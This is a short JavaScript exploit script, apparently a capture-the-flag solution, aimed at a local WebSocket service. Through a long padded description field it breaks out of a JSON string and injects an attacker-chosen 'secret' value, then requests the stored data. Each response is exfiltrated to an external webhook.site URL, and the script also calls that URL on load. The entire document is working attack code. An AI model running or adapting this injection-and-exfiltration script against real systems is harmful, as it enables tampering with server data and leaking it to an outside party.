const target = '127.0.0.1';
const ws = new WebSocket(`ws://${target}/ws`);
fetch("https://webhook.site/e98d9642-49ae-41a2-b67d-28e902f6b363")
ws.onopen = () => {
    ws.send(JSON.stringify({action:'add',title: 'A',description: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","secret":"00000000000000000000000000000000"}`}));
    ws.send(JSON.stringify({action:'get'}));
}
ws.onmessage = async (msg) => {
    fetch(`https://webhook.site/e98d9642-49ae-41a2-b67d-28e902f6b363?m=${msg.data}`)
}
